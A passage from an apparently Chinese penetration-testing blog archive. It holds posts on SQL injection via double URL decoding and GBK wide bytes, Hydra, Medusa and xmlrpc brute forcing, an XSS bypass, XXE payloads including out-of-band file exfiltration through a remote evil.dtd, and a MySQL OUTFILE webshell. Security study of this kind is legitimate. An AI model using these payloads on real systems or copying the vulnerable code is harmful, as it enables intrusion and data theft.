<h4 id="MSF爆破"><a href="#MSF爆破" class="headerlink" title="MSF爆破"></a>MSF爆破</h4><p>MSF中有专门爆破Tomcat的模块，如下所示：<br><img src="http://static.zybuluo.com/xmy2017/y60wk153m4st3hqn3hezryuj/11.png" alt="11.png-35.4kB"><br>进入该模块，查看配置参数：<br><img src="http://static.zybuluo.com/xmy2017/ow29c5ik2860aqplujnnukh5/12.png" alt="12.png-142.8kB"><br>配置参数：<br><img src="http://static.zybuluo.com/xmy2017/xjajbmwjvrok4z8i35euo4tt/13.png" alt="13.png-24.3kB"><br>启动爆破：<br><img src="http://static.zybuluo.com/xmy2017/fn76a1ej2kj313net50cpc0m/14.png" alt="14.png-17.9kB"></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>urldecode-二次解码引发注入</title>
    <url>/2020/01/14/urldecode-%E4%BA%8C%E6%AC%A1%E8%A7%A3%E7%A0%81%E5%BC%95%E5%8F%91%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>PHP中常用过滤函数如addslashes()、mysql_real_escape_string()、mysql_escape_string()或者使用魔术引号GPC开关来防止注入，原理都是给单引号（’）、双引号（”）、反斜杠（\）和NULL等特殊字符前面加上反斜杠来进行转义。</p>
<p>但是这些函数在遇到urldecode()函数时，就会因为二次解码引发注入。urldecode()函数是对已编码的URL进行解码。引发注入的原因其实很简单，PHP本身在处理提交的数据之前会进行一次解码，例如/test.php?id=1这个URL，我们构造字符串/test.php?id=1%2527，PHP第一次解码，%25解码成了%，于是url变成了/test.php?id=%27；然后urldecode()函数又进行了一次解码，%27解码成了’，于是最终URL变成了/test.php?id=1’，单引号引发了注入。rawurldecode()也会产生同样的问题，因此这两个函数需要慎用。</p>
<p>例子如下：</p>
<pre><code class="php">&lt;?php  
    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  

    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
    mysql_select_db(&quot;test&quot;, $conn);  
    //mysql_query(&quot;SET NAMES &#39;gbk&#39;&quot;, $conn);  

    $id = mysql_real_escape_string($_GET[&#39;id&#39;]);  
    $id = urldecode($id);  
    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
    $query = mysql_query($sql, $conn);  
    if($query == True)  
    {  
        $result = mysql_fetch_array($query);  
        $user = $result[&quot;user&quot;];  
        $email = $result[&quot;email&quot;];  

        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  
    }  
    mysql_close($conn);  
?&gt;  </code></pre>
<p>因为mysql_real_escape_string()是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。<br>普通的注入会被转义掉：<br><img src="http://static.zybuluo.com/xmy2017/gif2jlev0vf0473tgod7oj0y/image_1bfts63ru1olf1fhf5nsgo8ihh9.png" alt="image_1bfts63ru1olf1fhf5nsgo8ihh9.png-27.8kB"></p>
<p>于是构造URL编码引发注入：<br><img src="http://static.zybuluo.com/xmy2017/h9vajn45f3lmxi0fu4pyelnf/image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png" alt="image_1bfts6iea1jh1r5j1ros1rcj1jqvm.png-27.4kB"></p>
<p>可以使用sqlmap来跑这个注入，不过必须把payload构造好，如下：<br><font color=red>sqlmap -u”<a href="http://localhost/test/1.php?id=1%2527&quot;" target="_blank" rel="noopener">http://localhost/test/1.php?id=1%2527&quot;</a> –random-agent -v 3</font><br><img src="http://static.zybuluo.com/xmy2017/aj4qc6h1c031h9pg6s0c7ii8/image_1bfts72q515281pqk1jah17jhubo13.png" alt="image_1bfts72q515281pqk1jah17jhubo13.png-19.2kB"></p>
<p>感觉以后黑盒测试跑SQL注入可以在URL后面加上%2527，说不定就能瞎猫遇上死耗子碰到二次解码引发注入的情况。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>利用xmlrpc-php爆破wordpress</title>
    <url>/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/</url>
    <content><![CDATA[<p>最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。<br>利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。</p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击的方式为使用POST提交以下数据到xmlrpc.php：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
  &lt;params&gt;
   &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;
   &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;</code></pre><p>用户名或密码不正确，返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/c9wtvqu7pdept4tzrfc4ib5p/1.png" alt="1.png-24.5kB"><br>用户名和密码正确，则返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/wmcsmqzt0czpeq3ubv7gomzi/2.png" alt="2.png-35.7kB"> </p>
<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>修复方法有以下几种：<br>1.安装Login Security Solution插件。<br>2.删除xmlrpc.php文件。<br>3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。</p>
<h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：<br><img src="http://static.zybuluo.com/xmy2017/0suyjgu33n4bqahv7t9y9ncs/3.png" alt="3.png-43.4kB"><br>john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：<br><img src="http://static.zybuluo.com/xmy2017/jrukij419dehjdt0em088zo8/4.png" alt="4.png-99.8kB"></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>密码爆破神器Medusa</title>
    <url>/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/</url>
    <content><![CDATA[<p>Medusa，美杜莎，希腊神话中的蛇发女妖：<br> <img src="http://static.zybuluo.com/xmy2017/z6b3lk2o0jtkrfaykpxj5vm0/1.png" alt="1.png-832.7kB"></p>
<p>（挺奇怪为什么密码爆破神器都以希腊神话中的怪物命名）</p>
<p>与Hydra一样，Medusa支持多种协议的密码爆破，是当之无愧的密码爆破神器。</p>
<h3 id="Medusa选项"><a href="#Medusa选项" class="headerlink" title="Medusa选项"></a>Medusa选项</h3><p>Medusa的选项和参数如下：<br> <img src="http://static.zybuluo.com/xmy2017/h8kchdfgron5estw2uv3vdfn/2.png" alt="2.png-306.7kB"></p>
<p>-h [TEXT]　　　　目标主机名或IP<br>-H [FILE]　　　　目标主机文件<br>-u [TEXT]　　　　用户名<br>-U [FILE]　　　　用户名文件<br>-p [TEXT]　　　　密码<br>-P [FILE]　　　　密码文件<br>-C [FILE]　　　　组合条目文件，格式为：host:user:password<br>-O [FILE]　　　　日志信息文件<br>-e [n/s/ns]　　　n代表空密码，s代表用户名与密码相同<br>-M [TEXT]　　　　执行模块名称<br>-m [TEXT]　　　　传递参数到模块，可以传输多个参数<br>-d　　　　　　　　显示所有模块名称<br>-n [NUM]　　　　　指定非默认端口<br>-s　　　　　　　　启用SSL<br>-g [NUM]　　　　尝试连接超时时间（默认为3秒）<br>-r [NUM]　　　　重试间隔时间（默认为3秒）<br>-R [NUM]　　　　超时之前的尝试次数（N），总尝试次数为N+1<br>-C [NUM]　　　　socket连接等待时间（默认为500微秒）<br>-t [NUM]　　　　同时测试的登录数线程<br>-T [NUM]　　　　同时测试的主机数线程<br>-L　　　　　　　每个用户使用一个线程<br>-f　　　　　　　匹配第一个结果时停止破解<br>-q　　　　　　　显示模块的使用信息<br>-v [NUM]　　　　详细信息显示级别[0-6]<br>-w [NUM]　　　　错误高度信息显示级别[0-6]<br>-V　　　　　　　显示版本<br>-Z [TEXT]　　　继续上一次扫描</p>
<h3 id="Medusa举例"><a href="#Medusa举例" class="headerlink" title="Medusa举例"></a>Medusa举例</h3><p>Medusa支持的协议（称之为模块）如下：<br><img src="http://static.zybuluo.com/xmy2017/z0lki501exe8tb43h60drxqj/3.png" alt="3.png-306.7kB"><br>爆破ssh密码：</p>
<pre><code>medusa -u root -P pass_top100.txt -e ns -h 192.168.216.130 -M ssh</code></pre>

<p><img src="http://static.zybuluo.com/xmy2017/wvsn9uegw5xq7posljxvexal/4.png" alt="4.png-154.4kB"><br>可以使用-q查阅模块的使用信息，比如查阅web-form模块：</p>
<pre><code>medusa -M web-form –q</code></pre>

<p><img src="http://static.zybuluo.com/xmy2017/ublm9ntj4a6u6xa3uble6ws6/5.png" alt="5.png-218.1kB"><br>爆破http：</p>
<p>medusa -u admin -P pass.txt -h 192.168.216.1 -f -M web-form -m FORM:”dvwa/vulnerabilities/brute/“ -m FORM-DATA:”get?username=&amp;password=&amp;Login=Login” -m DENY-SIGNAL:”incorrect” -m CUSTOM-HEADER:”Cookie: security=low;PHPSESSID=js5pe87plji0pug7oab1278ho4” -m USER-AGENT:”Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0”</p>
<p><img src="http://static.zybuluo.com/xmy2017/hfl4gtf8ftlz58u4juso8edg/6.png" alt="6.png-161.5kB"> </p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>密码爆破神器Hydra</title>
    <url>/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/</url>
    <content><![CDATA[<p>Hydra，希腊神话中的怪兽许德拉，就是九头蛇，长这样：<br><img src="http://static.zybuluo.com/xmy2017/vmxy5ido5vv1fnfd1i6rgn9a/1.jpg" alt="1.jpg-53.7kB"><br>好吧，扯远了，我们要说的是Kali中的密码爆破神器Hydra。Hydra支持多种协议的破解，Github上的地址是：<br><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a><br>Hydra也有Windows版本，Github上的地址是：<br><a href="https://github.com/maaaaz/thc-hydra-windows" target="_blank" rel="noopener">https://github.com/maaaaz/thc-hydra-windows</a><br>Hydra目前支持的协议如下：<br><img src="http://static.zybuluo.com/xmy2017/bnrm4tbimh2gmgbc5l0h4l16/2.png" alt="2.png-89kB"></p>
<h3 id="Hydra选项"><a href="#Hydra选项" class="headerlink" title="Hydra选项"></a>Hydra选项</h3><p>Hydra的选项如下：<br><img src="http://static.zybuluo.com/xmy2017/1auhz1empzqwnjynmz25c24o/3.png" alt="3.png-365.5kB"><br>翻译一下：</p>
<pre><code>-R　　继续从上一次中断的进度进行破解
-I　　忽略已存在的存储文件（不需要等待10秒）
-S　　采用SSL连接
-s PORT    　指定非默认端口
-l LOGIN or –L FILE     -l后接用户名，-L后接用户字典文件
-p PASS or –P FILE      -p后接密码，-P后接密码字典文件
-x MIN:MAX:CHARSET　密码生成器，输入“-x -h”来获取帮助信息
-y      禁止在暴力破解中使用符号
-e    nsr    n表示空密码，s表示用户名和密码相同，r表示用户名和密码翻转
-u    围绕用户名进行探测
-C FILE      字典格式为login:pass，取代-L/-P选项
-M FILE      同时攻击多个服务，每行一个服务名，冒号后接端口
-o FILE   指定结果输出文件，用于替代标准屏幕输出
-b FORMAT    指定输出文件格式，有text（默认）、json、jsonv1
-f/-F        当找到第一个匹配结果时中断破解（-M: -f表示
中断单个目标的破解；-F表示中断全部目标的破解）
-t TASKS    指定单个目标的线程数（默认是16）
-T TASKS    指定全部目标的线程数（默认是64）
-w/-W TIME    指定最大响应超时时间（默认是32）/每个线程的间隔时间（默认是0）
-c TIME        指定每次登录的尝试等待时间
-4/-6        指定IPv4（默认）/IPv6
-v/-V/-d    -v显示全部信息，-V显示每次登录的用户名/密码，-d显示debug信息
-O      使用SSL v2和v3
-q      不显示连接出错信息
-U      显示详细的服务模块信息
-h      显示帮助信息
server      指定目标，可以是域名、IP或者网段
service     指定服务协议（选项后面列出了支持的服务）
OPT     一些支持的额外选项</code></pre><h3 id="Hydra举例"><a href="#Hydra举例" class="headerlink" title="Hydra举例"></a>Hydra举例</h3><p>hydra –help最后有相应举例：<br><img src="http://static.zybuluo.com/xmy2017/dwtn4x3x74l07htsyhz1une8/4.png" alt="4.png-50.9kB"><br>这些都比较简直，就不详细说明了。举一个比较复杂的例子，http的爆破。使用-U可以显示模块的详细信息，查看http-post-form的信息如下：<br><img src="http://static.zybuluo.com/xmy2017/28c7xxhkepr8x57qrh92hffr/8.png" alt="8.png-358kB"><br>　　http爆破如下：<br><img src="http://static.zybuluo.com/xmy2017/6ju6cjmfc7iwe9m69pthhwa4/5.png" alt="5.png-87.7kB"><br>图中http-post-form分成了三个段，用冒号分隔。第一段是路径；第二段是提交的参数，爆破的参数用^^包围起来；第三段是错误的关键字。</p>
<h3 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h3><p>来看一下Hydra的密码生成器功能。<br><img src="http://static.zybuluo.com/xmy2017/7uvw6obv6eux1tiei5kt623c/6.png" alt="6.png-101kB"><br>用法是-x MIN:MAX:CHARSET，描述如下：</p>
<pre><code>MIN        密码最小长度
MAX        密码最大长度
CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代表数字,特殊字符需要一个个写进来
-y        禁止使用占位符</code></pre><p>使用如下：<br><img src="http://static.zybuluo.com/xmy2017/9lore17e0akks46cxt8bchsi/7.png" alt="7.png-152.6kB"></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>htmlspecialchars-函数过滤XSS的问题</title>
    <url>/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>htmlspecialchars()函数的功能如下：<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p>
<pre>& （和号）成为 &
" （双引号）成为 "
' （单引号）成为 '
< （小于）成为 <
> （大于）成为 ></pre>

<p>它的语法如下：</p>
<pre>htmlspecialchars(string,flags,character-set,double_encode)</pre>

<p>其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下：<br>可用的引号类型：<br>ENT_COMPAT - 默认。仅编码双引号。<br>ENT_QUOTES - 编码双引号和单引号。<br>ENT_NOQUOTES - 不编码任何引号。<br>默认是只编码双引号的！默认只编码双引号！默认只编码双引号……重要的事情说三遍！！！</p>
<p>于是看下面的代码：</p>
<pre><code class="php">&lt;?php   
    $name = $_GET[&quot;name&quot;];  
    $name = htmlspecialchars($name);  
?&gt;  

&lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; </code></pre>
<p>轻松绕过：<br><img src="http://static.zybuluo.com/xmy2017/f9w12k9hraepojh38e1nxswn/image_1bftto1vk1obet9dau91pkq11559.png" alt="image_1bftto1vk1obet9dau91pkq11559.png-94.4kB"><br>加上ENT_QUOTES参数：</p>
<pre><code class="php">&lt;?php   
    $name = $_GET[&quot;name&quot;];  
    $name = htmlspecialchars($name, ENT_QUOTES);  
?&gt;  

&lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; </code></pre>
<p>发现无法绕过了：<br><img src="http://static.zybuluo.com/xmy2017/kufslbaofmpw2naqxv7fci8l/image_1bfttoqf017gu1b911n0sqt91d9cm.png" alt="image_1bfttoqf017gu1b911n0sqt91d9cm.png-20.9kB"></p>
<p>查看源代码：<br><img src="http://static.zybuluo.com/xmy2017/8dsg1ec1idaq36nhx4t7iykg/image_1bfttpbfgqbq1pdoq421coe9pi13.png" alt="image_1bfttpbfgqbq1pdoq421coe9pi13.png-26.9kB"><br>单引号已经被转换了。</p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE注入</title>
    <url>/2020/01/14/XXE%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="XXE注入攻击简介"><a href="#XXE注入攻击简介" class="headerlink" title="XXE注入攻击简介"></a>XXE注入攻击简介</h3><p>XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。<br>在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。<br>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。</p>
<h3 id="XXE注入利用"><a href="#XXE注入利用" class="headerlink" title="XXE注入利用"></a>XXE注入利用</h3><p>首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p>
<h4 id="简单检测"><a href="#简单检测" class="headerlink" title="简单检测"></a>简单检测</h4><p>Payload如下：</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE any[
&lt;!ENTITY test &quot;this is a test&quot;&gt;
]&gt;
&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>Payload如下：</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;  
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
<h4 id="加载外部实体"><a href="#加载外部实体" class="headerlink" title="加载外部实体"></a>加载外部实体</h4><p>Payload如下：</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY %file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/issue&quot;&gt;
&lt;!ENTITY %dtd SYSTEM  &quot;http://192.168.1.111/evil.dtd&quot;&gt;
%dtd;
%send;
]&gt;</code></pre>
<p>远程服务器（192.168.1.111）的evil.dtd内容如下：</p>
<pre><code class="xml">&lt;!ENTITY % all
&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://192.168.1.111/?%file;&#39;&gt;&quot;
&gt;
%all;</code></pre>
<p>触发XXE攻击后，远程服务器可以接收到文件内容，也可以通过日志查看目标服务器是否有发送<a href="http://192.168.1.111/evil.dtd" target="_blank" rel="noopener">http://192.168.1.111/evil.dtd</a>的请求。</p>
<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>Payload如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test SYSTEM  &quot;expect://id&quot;&gt;  
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><p>服务器需要有expect扩展才能执行。</p>
<h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><p>Payload如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test SYSTEM &quot;http://192.168.1.1:22&quot;&gt;  
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>　　Payload如下：</p>
<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ELEMENT lolz (#PCDATA)&gt;
&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p>上面样例中的XXE漏洞攻击就是著名的“billion laughs”(<a href="https://en.wikipedia.org/wiki/Billion_laughs" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Billion_laughs</a>)攻击，该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>　　XXE漏洞存在是因为XML解析器解析了用户发送的不可信数据。然而，要去校验DTD(document type definition)中SYSTEM标识符定义的数据，并不容易，也不大可能。大部分的XML解析器默认对于XXE攻击是脆弱的。因此，最好的解决办法就是配置XML处理器去使用本地静态的DTD，不允许XML中含有任何自己声明的DTD。通过设置相应的属性值为false，XML外部实体攻击就能够被阻止。因此，可将外部实体、参数实体和内联DTD 都被设置为false，从而避免基于XXE漏洞的攻击。</p>
<h3 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>　　演示示例来自<a href="http://testhtml5.vulnweb.com/" target="_blank" rel="noopener">http://testhtml5.vulnweb.com/</a>，这是一个Acunetix维护的demo站点，用于测试Acunetix web扫描器的功能。XXE注入漏洞的测试点在Login处的“Forget Pwd”：<br><img src="http://static.zybuluo.com/xmy2017/egopruw2sq5hqjv9mhs8tqdp/1.png" alt="1.png-90.4kB"><br>用Burpsuite抓包如下：<br> <img src="http://static.zybuluo.com/xmy2017/80bh297gc517bgbd4jgb3av0/2.png" alt="2.png-44.7kB"><br>构造测试Payload如下：<br> <img src="http://static.zybuluo.com/xmy2017/7t8ta1ml3myk4khppoocla6b/3.png" alt="3.png-55.2kB"><br>可见服务器执行了Payload，该页面易受XXE注入攻击。</p>
<p>参考：<br><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a><br><a href="http://www.91ri.org/9539.html" target="_blank" rel="noopener">http://www.91ri.org/9539.html</a></p>
]]></content>
      <categories>
        <category>XXE注入</category>
      </categories>
      <tags>
        <tag>XXE注入</tag>
      </tags>
  </entry>
  <entry>
    <title>宽字节注入</title>
    <url>/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：</p>
<pre><code class="php">    &lt;?php  
    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  
    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
    mysql_select_db(&quot;test&quot;, $conn);  
    mysql_query(&quot;SET NAMES GBK&quot;, $conn);    //不安全的编码方式  

    $id = addslashes($_GET[&#39;id&#39;]);          //不安全的转义函数  
    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
    $query = mysql_query($sql, $conn);  
    if($query == True)  
    {  
        $result = mysql_fetch_array($query);  
        $user = $result[&quot;user&quot;];  
        $email = $result[&quot;email&quot;];  

        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
        $sql = mb_convert_encoding($sql, &quot;UTF-8&quot;, &quot;GBK&quot;);  
        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  

    }  

    mysql_close($conn);  
    ?&gt;</code></pre>
<p><img src="http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png" alt="image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB"></p>
<p>单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：<br><img src="http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png" alt="image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB"></p>
<p>漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：<br>set character_set_connection = gbk,<br>set character_set_results=gbk,<br>set character_set_client=gbk<br>而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。</p>
<p> 漏洞的防范方法有以下几种：<br>1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。<br>2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。<br>3） 使用pdo方式预编译处理数据库查询。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql导出一句话</title>
    <url>/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<p>执行语句如下：</p>
<pre><code class="php+HTML">create table yjh(cmd varchar(50));
insert into yjh(cmd) values(&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;);
select cmd from yjh into outfile &#39;D:/www/example/cmd.php&#39;;
drop table yjh;</code></pre>
<p>要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：<br>● null，表示不允许导入/导出，默认状态为null；<br>● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；<br>● 没有具体的值，表示不对mysql的导入/导出做出限制。</p>
<p>启用secure-file-priv的方法：<br>● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =<br>● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =</p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL注入</title>
    <url>/2020/01/13/MySQL%E6%B3%A8%E5%85%A5/</url>
